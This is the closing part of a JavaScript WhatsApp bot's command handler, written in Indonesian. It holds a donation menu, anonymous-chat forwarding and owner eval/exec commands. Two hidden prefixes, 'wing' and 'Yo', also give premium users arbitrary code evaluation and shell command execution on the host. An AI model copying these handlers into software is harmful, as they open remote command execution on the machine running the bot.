\n͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏  *Jangan Lupa Subscribe Untuk Mendapatkan Update Script Bot*')
break
	    case 'donasi': case 'donate': case 'sewabot': case 'sewa': case 'buypremium': case 'donate': {
                zaki.sendMessage(m.chat, { image: { url: 'https://i.ibb.co/5Gpzr1Q/20220422-170038.jpg' }, caption: `*── 「 DONATE 」 ──*\n\n_Kalian Bisa Dukung Bot Lewat Donate Ke :_\n _》Dana : 085770017326_\n _》Gopay : -_\n _》Pulsa : 085770017326 ( Indosat )_\n\n_Donate Kalian Sangat Berarti._\n\n_Contact person Owner:_\n_wa.me/6285770017326_` }, { quoted: m })
            }
            break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }
                
                if (budy.startsWith('wing')) {
                    if (!isCreator && !isPremium) return m.reply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return m.reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if(err) return m.reply(err)
                        if (stdout) return m.reply(stdout)
                    })
                }
                
                if (budy.startsWith('Yo')) {
                    if (!isCreator && !isPremium) return m.reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if(err) return m.reply(err)
                        if (stdout) return m.reply(stdout)
                    })
                }
			
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    this.anonymous = this.anonymous ? this.anonymous : {}
                    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
			
		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    zaki.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
        

    } catch (err) {
        m.reply(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
